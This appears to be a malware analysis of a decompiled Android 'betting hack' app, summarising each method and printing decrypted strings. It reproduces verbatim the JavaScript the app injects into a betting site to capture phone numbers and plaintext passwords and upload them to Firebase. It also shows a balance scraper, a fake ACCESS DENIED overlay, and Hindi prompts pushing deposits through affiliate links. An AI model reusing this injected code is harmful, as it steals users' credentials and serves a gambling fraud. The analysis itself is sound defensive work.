class='tip-box'>Tap the colorful circle to change the UI color.</div>            <div class='tip-box'>The bypass chip shows the active mode — tap to switch.</div>            <div class='tip-box'>Tap HIDE to close the panel.</div>          </div>          <div class='settings-section'>            <div class='settings-label'>AUTO COLOR</div>            <div class='tip-box'>Choose “Auto” to cycle themes every 6s.</div>          </div>        </div>      </div>    </div>  </div>  

// ==== section: hud head (doctype / viewport / font origin), verbatim
// <!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover'><link href='https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700;900&display=swap' rel='stylesheet'>

// ==== section: native-only logic (smali, deobfuscated strings)
// Everything below lives as real Dalvik, not in the HTML. "line N ->" entries are the
// decoded const-string payloads of the named method in file order; the prose is a
// faithful summary of that method's control flow. Original guards, the entitlement check
// and the credential harvesting are documented, not removed.

// ---- b/a.decrypt   [StringFog accessor]
  // smali line 75 -> "UTF-8"
  // (1 non-carrier string constants listed)
  // b/a implements a/a. static decrypt(String) forwards to the virtual decrypt(String, "UTF-8");
  // that calls android.util.Base64.decode(s, 2 /* NO_WRAP */), XORs every byte against
  // key.charAt(i % key.length()) in place (private b/a.a([B, String)) and returns
  // new String(bytes, "UTF-8"). The key is the hard-coded literal "UTF-8" -- the same routine
  // is also used at runtime for encrypt(). Nothing is salted per class, which is why one
  // decoder covers the whole dex.

// ---- MainActivity.c   [HUD loader and whole bootstrap]
  // smali line 190 -> "https://www.raja8899.net/#/register?invitationCode=822783704787"
  // smali line 200 -> "https://rajaactivity.com/#/wallet/Recharge,"
  // smali line 218 -> "0.00"
  // smali line 224 -> "none"
  // smali line 346 -> "TeamBridge"
  // smali line 3568 -> "file:///android_res/drawable/"
  // smali line 3574 -> "text/html"
  // smali line 3580 -> "UTF-8"
  // (8 non-carrier string constants listed)
  // 3,517 smali lines (149-3665) and the only entry point that matters; onCreate() calls b()
  // then c(). Structure:
  //   154-184  pre-loads 16 HUD carrier literals into v7..v22 so the builder can append them
  //            out of order later -- the StringFog ordering trick that defeats naive extractors.
  //   186-215  builds the side-channel constants: String[]{register URL}, String[]{deposit URL},
  //            double[]{300.0}, plus the literals "0.00" and "none" (the initial balance and the
  //            initial panel visibility handed to the builder).
  //   217-241  hardens the GAME WebView (field d): setJavaScriptEnabled, setDomStorageEnabled,
  //            setDatabaseEnabled, setMixedContentMode(0), setCacheMode(-1),
  //            setLoadsImagesAutomatically, setLayerType(2, null), setFocusableInTouchMode,
  //            requestFocus.
  //   243-352  constructs k (the TTS wrapper) and i (the bridge), addJavascriptInterface(bridge,
  //            "TeamBridge") on the game WebView, then gameWebView.loadUrl(registerUrl[0]) -- the
  //            app opens straight onto the affiliate registration link.
  //   354-3560 the StringBuilder replay documented in the header: the whole HUD string.
  //   3562-3600 creates the overlay HUD WebView (subclass p), enables JS on it, attaches the drag
  //            listener q, loadDataWithBaseURL("file:///android_res/drawable/", html, "text/html",
  //            "UTF-8", null), addJavascriptInterface(bridge, "TeamBridge") on it too, and
  //            addView()s it into the decor's root ViewGroup at 85dp x 85dp, topMargin 400,
  //            leftMargin 50.
  //   3606-3654 new Timer().scheduleAtFixedRate(u, 500, 500) -- starts the guard/watchdog poll.
  //   3656-3662 setWebViewClient(v) on the game WebView -- installs the credential hook.
  // If the overlay WebView array slot is already populated the builder result is discarded and
  // only the Timer + client install runs, so c() is re-entrant after a return from DebugActivity.

// ---- MainActivity.b   [game webview + Firebase listener]
  // smali line 114 -> "auth"
  // (1 non-carrier string constants listed)
  // findViewById(0x7f0801e3) -> the game WebView into field d; setJavaScriptEnabled(true) and
  // setSupportZoom(true); opens SharedPreferences "auth" into field f (never used again);
  // installs WebViewClient b; then creates the ChildEventListener o and registers it on the
  // database node "users" -- the app stream-reads the entire users node from launch.

// ---- MainActivity.constructor   [field defaults]
  // smali line 56 -> "users"
  // (1 non-carrier string constants listed)
  // new Timer(), FirebaseDatabase.getInstance(), double 0.0 (field c), two fresh Intents, and
  // database.getReference("users") cached in field g. Field h is the listener, i the second Intent.

// ---- MainActivity.onCreate   [lifecycle]
  // (0 non-carrier string constants listed)
  // Standard AppCompatActivity onCreate: applies the theme, setContentView, then b(bundle) and
  // c(). onBackPressed() finishes to the game WebView rather than exiting the panel.

// ---- i.goToDeposit   [TeamBridge method published to JS]
  // @JavascriptInterface. runOnUiThread(g): gameWebView.loadUrl(depositArray[0]). The URL is not visible to JS.

// ---- i.goToRegister   [TeamBridge method published to JS]
  // @JavascriptInterface. runOnUiThread(h): gameWebView.loadUrl(registerArray[0]), i.e. the affiliate register link with the original invitation code. Published but NOT used by the HUD JS -- the HUD inlines the same URL through loadUrl(); the only caller is the ACCESS DENIED card injected by c.run().

// ---- i.loadUrl   [TeamBridge method published to JS]
  // @JavascriptInterface. runOnUiThread(f): gameWebView.loadUrl(<caller string>) -- the open redirect sink that render()'s LOGIN NOW button drives.

// ---- i.resizeView   [TeamBridge method published to JS]
  // @JavascriptInterface. runOnUiThread(e): reads display density, takes the overlay WebView[0]'s FrameLayout.LayoutParams and sets width = arg1*density, height = arg2*density, then re-centres leftMargin/topMargin by half the delta. The HUD calls resizeView(0, 340, 400) to expand the pill into the panel and resizeView(0, 90, 90) to shrink it back; the 3-argument JS signature only maps two of them onto fields, so the first argument is the x-offset that ends up unused.

// ---- i.speak   [TeamBridge method published to JS]
  // @JavascriptInterface. Forwards to k.speak(text) -> Android TextToSpeech; class j is the OnInitListener that pins the voice to hi-IN, so every prompt in the app is spoken in Hindi.

// ---- i.verifyUser   [TeamBridge method published to JS]
  // smali line 196 -> "users"
  // @JavascriptInterface -- THE ENTITLEMENT / PHONE GATE. FirebaseDatabase.getInstance().getReference("users").child(<phone>).addListenerForSingleValueEvent(d); d.onDataChange posts c to the UI thread. No local allow-list, no token, no expiry: the check is purely "does this 10-digit phone number exist as a child of users".

// ---- i.sendData   [TeamBridge method published to JS]
  // smali line 126 -> "password"
  // smali line 134 -> "phone"
  // smali line 146 -> "users"
  // smali line 164 -> "रजिस्ट्रेशन डेटा बेस में सुरक्षित कर दिया गया है।"
  // @JavascriptInterface -- THE CREDENTIAL HARVEST. Builds a HashMap whose two keys are decrypt("JTU1Xk86JiI=") -> "password" and decrypt("JTwpQ10=") -> "phone", i.e. {password: arg2, phone: arg1}, then getReference("users").child(<arg1>).updateChildren(map): it writes the victim's own phone and plaintext password under their own number -- which simultaneously makes verifyUser() pass for them. Finally speaks the Hindi confirmation "registration data has been secured in the database".

// ---- u.run()   [TimerTask tick]
  // no const-strings at all: every 500ms it only does
  //   MainActivity.runOnUiThread(new t(this, routeLatchArray, tts, webViewArray))
  // so all real work happens on the UI thread in t, and u is just the scheduler shim.

// ---- t.run()   [the guard: URL sniffing, Hindi prompts, balance scrape]
  // smali line 64 -> "waiting"
  // smali line 70 -> "register"
  // smali line 80 -> "login"
  // smali line 99 -> "wingo"
  // smali line 126 -> "recharge"
  // smali line 136 -> "deposit"
  // smali line 150 -> "wallet"
  // smali line 191 -> "हैक एक्टिव करने के लिए मिनिमम डिपॉजिट जमा करें।"
  // smali line 203 -> "reg"
  // smali line 279 -> "इस हैक को चालू करने के लिए नए नंबर से एक अकाउंट बनाएं।"
  // smali line 292 -> "पुराना अकाउंट लॉगिन ना करें, नया अकाउंट बनाएं।"
  // smali line 312 -> "(function(){    var sel=['.balance-amount','.money','.balanceNum','.amount'];    for(var x of sel){ var e=document.querySelector(x); if(e && e.innerText.includes('.') && !isNaN(parseFloat(e.innerText.replace(/[^0-9.]/g,'')))) return e.innerText; }    var m=document.body.innerText.match(/[₹]?\\s?([\\d,]+\\.\\d{2})/); return m?m[1]:'0.00'; })();"
  // The watchdog. Reads the GAME WebView's getUrl(); returns immediately when null; otherwise
  // lower-cases it and classifies it with String.contains() against decrypted needles, keeping
  // the last emitted route in a 1-element String[] (field b, primed to "waiting" by c()):
  //   * url contains "register" OR "login"  -> the registration branch: latch is rewritten and
  //     the Hindi prompts "create an account with a NEW number to run this hack" and "do not
  //     log in with an old account, create a new account" are spoken when the latch changed;
  //     the route handed to s is "reg".
  //   * url contains "wingo"               -> route "wingo" (the panel's working state).
  //   * url contains "recharge" OR "deposit" OR "wallet" -> speaks the Hindi "deposit the
  //     minimum deposit to activate the hack" and routes "reg".
  //   * otherwise the latch keeps the previous value.
  // The latch comparison is what makes the 500ms poll idempotent: prompts and route pushes fire
  // once per page transition, not once per tick. Whatever the branch, the method ends by
  // evaluateJavascript()-ing the verbatim scraper below onto the GAME WebView with a new s(...)
  // as its ValueCallback, and s is constructed holding the route string.
  // verbatim balance scraper injected into the game page (its return value becomes the
  // panel's balance -- the ONLY data the panel ever takes from the real site):
  // (function(){    var sel=['.balance-amount','.money','.balanceNum','.amount'];    for(var x of sel){ var e=document.querySelector(x); if(e && e.innerText.includes('.') && !isNaN(parseFloat(e.innerText.replace(/[^0-9.]/g,'')))) return e.innerText; }    var m=document.body.innerText.match(/[₹]?\s?([\d,]+\.\d{2})/); return m?m[1]:'0.00'; })();

// ---- s.onReceiveValue(String)   [guard: pushes state + balance into the HUD]
  // smali line 51 -> "null"
  // smali line 66 -> "\""
  // smali line 72 -> ""
  // smali line 86 -> "0.00"
  // smali line 105 -> "route('"
  // smali line 117 -> "', '"
  // smali line 127 -> "');"
  // ValueCallback for the scrape above; the route name is baked in at construction (field c).
  // Normalises the raw DOM text: a null reference, or the literal "null", both become
  // decrypt("ZXp2HQ==") = "0.00"; otherwise every '"' is stripped and the value trimmed. It then
  // concatenates decrypt("JzszWV19cw==") + <route> + decrypt("cnhmCg==") + <balance> +
  // decrypt("cn19") -- i.e. the single statement  route('<route>', '<balance>');  and
  // evaluateJavascript()s it on the OVERLAY HUD WebView (webViewArray[0], null-guarded). That is
  // the only channel from the real game into the panel, and it carries money, not results.

// ---- v.onPageFinished(WebView, String)   [credential hook injected into the game]
  // smali line 32 -> "(function(){    setInterval(function(){        var ph=document.querySelector('input[type=\"tel\"]') || document.querySelector('input[placeholder*=\"phone\"]');        var ps=document.querySelector('input[type=\"password\"]') || document.querySelector('input[placeholder*=\"password\"]');        var bs=document.querySelectorAll('button');        if(window.location.href.includes('login') && ph){            if(!ph.getAttribute('hooked')){                ph.setAttribute('hooked','1');                ph.addEventListener('input', function(){                    if(ph.value.length === 10){ TeamBridge.verifyUser(ph.value); }                });            }        }        bs.forEach(function(b){            if(window.location.href.includes('register') && !b.getAttribute('h')){                b.setAttribute('h','1'); b.addEventListener('click',function(){                    if(ph && ps && ph.value.length>=10) TeamBridge.sendData(ph.value,ps.value);                });            }        });    }, 1000); })();"
  // Runs on every finish of the GAME WebView and evaluateJavascript()s the verbatim payload
  // below onto the live betting page. It polls the page every 1000ms: while the URL contains
  // "login" it finds the phone input (input[type="tel"], else
  // input[placeholder*="phone"]), tags it hooked=1 once and wires an 'input' listener that, at
  // exactly 10 digits, calls TeamBridge.verifyUser(phone) -- the entitlement check. Then, for
  // every <button> while the URL contains "register", it tags h=1 once and wires a click
  // listener that calls TeamBridge.sendData(phone, password) with the tel + password field
  // values, uploading the victim's plaintext password to Firebase under their own number.
  // verbatim hook payload:
  // (function(){    setInterval(function(){        var ph=document.querySelector('input[type="tel"]') || document.querySelector('input[placeholder*="phone"]');        var ps=document.querySelector('input[type="password"]') || document.querySelector('input[placeholder*="password"]');        var bs=document.querySelectorAll('button');        if(window.location.href.includes('login') && ph){            if(!ph.getAttribute('hooked')){                ph.setAttribute('hooked','1');                ph.addEventListener('input', function(){                    if(ph.value.length === 10){ TeamBridge.verifyUser(ph.value); }                });            }        }        bs.forEach(function(b){            if(window.location.href.includes('register') && !b.getAttribute('h')){                b.setAttribute('h','1'); b.addEventListener('click',function(){                    if(ph && ps && ph.value.length>=10) TeamBridge.sendData(ph.value,ps.value);                });            }        });    }, 1000); })();

// ---- c.run()   [verifyUser's Firebase callback: the ACCESS DENIED gate]
  // smali line 47 -> "एक्सेस डिनाइड। कृपया पहले रजिस्टर करें।"
  // smali line 69 -> [2091 chars of HTML, emitted verbatim below]
  // smali line 75 -> "text/html"
  // smali line 81 -> "UTF-8"
  // smali line 98 -> "वेरिफिकेशन सफल।"
  // snapshot.exists() == false -> speak the Hindi refusal and
  // loadDataWithBaseURL("file:///android_res/drawable/", <ACCESS DENIED html>, "text/html",
  // "UTF-8", null) onto the GAME WebView, hijacking the betting page with a red neon card,
  // "ACCESS DENIED / Unregistered account detected! Please register a NEW ACCOUNT to activate
  // the premium tool", whose REGISTER NOW button calls TeamBridge.goToRegister().
  // snapshot.exists() == true -> speak only the Hindi "verification successful" and touch
  // nothing. So the gate is: your phone must already be a child of Firebase "users".
  // verbatim ACCESS DENIED page pushed over the game when the phone is not registered:
  // <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>*{box-sizing:border-box;margin:0;padding:0;user-select:none;-webkit-user-select:none;}body{background:#000;font-family:'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;overflow:hidden;}.card-container{width:100%;max-width:360px;background:#0a0a0a;border:2px solid #ff003c;border-radius:20px;box-shadow:0 0 25px #ff003c,inset 0 0 15px rgba(255,0,60,0.3);padding:30px 20px;text-align:center;display:flex;flex-direction:column;align-items:center;}.icon-box{margin-bottom:16px;}.warning-icon{width:60px;height:60px;filter:drop-shadow(0 0 8px #ff003c);}.title{color:#fff;font-size:22px;font-weight:800;letter-spacing:2px;text-shadow:0 0 12px #ff003c;margin-bottom:16px;}.description{color:#d1d5db;font-size:14px;line-height:1.5;margin-bottom:26px;font-weight:500;}.description b{color:#fff;}.btn-register{width:100%;padding:14px 0;background:linear-gradient(180deg,#ff1a40 0%,#b30024 100%);border:1px solid #ff4d6d;border-radius:12px;color:#fff;font-size:16px;font-weight:800;letter-spacing:1.5px;box-shadow:0 0 15px rgba(255,0,60,0.6);cursor:pointer;outline:none;}.btn-register:active{transform:scale(0.97);}</style></head><body><div class="card-container"><div class="icon-box"><svg class="warning-icon" viewBox="0 0 24 24" fill="none" stroke="#ff003c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg></div><div class="title">ACCESS DENIED</div><div class="description">Unregistered account detected!<br>Please register a <b>NEW ACCOUNT</b> to activate the premium tool.</div><button class="btn-register" onclick="handleRegister()">REGISTER NOW</button></div><script>function handleRegister(){if(typeof TeamBridge!=='undefined'&&TeamBridge.goToRegister){TeamBridge.goToRegister();}}</script></body></html>

// ---- k.speak   [TTS sink]
  // (0 non-carrier string constants listed)
  // Guards on the TextToSpeech handle in its 1-element array; if initialised it calls tts.speak(text, QUEUE_ADD, null, <tag>) and swallows failures. Every Hindi prompt in the app and every JS TeamBridge.speak() call lands here.

// ---- j.onInit   [TTS init listener]
  // smali line 47 -> "hi"
  // smali line 53 -> "IN"
  // (2 non-carrier string constants listed)
  // On success sets the voice to the two literals below (language "hi", country "IN") and caches the engine into k's array, so prompts are spoken in Hindi.

// ---- p.dispatchTouchEvent   [overlay HUD WebView subclass]
  // (0 non-carrier string constants listed)
  // Overrides dispatchTouchEvent so the small floating pill only consumes touches that land on it and everything else passes through to the game WebView underneath -- this is what lets the panel sit on top of the betting site without blocking it.

// ---- q.onTouch   [pill drag handle]
  // (0 non-carrier string constants listed)
  // Tracks ACTION_DOWN / MOVE / UP on the overlay and rewrites its FrameLayout leftMargin/topMargin from the touch delta so the user can drag the 85dp pill anywhere on screen; returns true to keep the gesture stream.

// ---- o.onChildAdded   [Firebase ChildEventListener on "users"]
  // (0 non-carrier string constants listed)
  // onChildAdded and onChildChanged each take snapshot.getKey() and pull a GenericTypeIndicator<HashMap> (inner classes l and m) -- and then return, discarding the value. The stream listener exists to keep the users node warm and to know that registration data arrived, not to branch on it. onChildMoved and onChildRemoved are empty stubs; onCancelled logs.

// ---- d.onDataChange   [verifyUser's single-value listener]
  // (0 non-carrier string constants listed)
  // Bundles the snapshot into class c (above) and runOnUiThread()s it; onCancelled is an empty stub, so a Firebase failure silently means "not verified" only if the event never fires at all -- no error page is shown for a network failure.

// ---- w.uncaughtException   [crash funnel]
  // smali line 45 -> "error"
  // (1 non-carrier string constants listed)
  // SketchApplication's Thread.setDefaultUncaughtExceptionHandler: writes decrypt -> "error" and restarts into DebugActivity, so a fatal builder or HUD exception routes to a debug screen instead of killing the panel -- a broken HUD would look like a blank pill rather than a crash.

// ==== END
// RECOVERY VERDICT: nothing in the HUD was unrecoverable.
//   recovered 51241 chars, 412 builder slots, replay anomalies 0, 18/18 slices tile the
//   script body exactly; the injection markers named in the header are absent.
//   node --check: PASS (exit 0, no SyntaxError)
// ABSENT FROM THIS BUILD (recorded, not hidden):
//  * No server-side prediction API, no result websocket, no game API polling. The only
//    outbound URLs are the two affiliate pages: https://www.raja8899.net/#/register?invitationCode=822783704787 and https://rajaactivity.com/#/wallet/Recharge,.
//  * Firebase (com.google.firebase.database) is used solely for the users/<phone>
//    entitlement record that sendData() writes and verifyUser() reads; no prediction
//    data is stored or fetched there.
//  * No digit lookup table exists in the HUD. Size and colour are computed from the
//    random digit (n >= 5 -> BIG; n % 2 == 1 -> GREEN; 0 and 5 -> coin-flip GREEN/RED),
//    and V1/V2/V4 only null out fields of that same roll.
//  * The 'accuracy' figure is decrypt-free arithmetic only:
//    Math.random() * (100.0 - 95.0) + 95.0, fixed to one decimal -- a display value.
//  * SharedPreferences "auth": the key exists, no read or write of it does.
//  * e/f/g/h are opaque single-run Runnable trampolines for the bridge; their behaviour
//    is fully described above and they carry no string literals of their own.
//  * minReqValue 300.0 is the only numeric gate; it arrives as a double[] append(D),
//    not as a string literal, which is why the replay models double arrays.
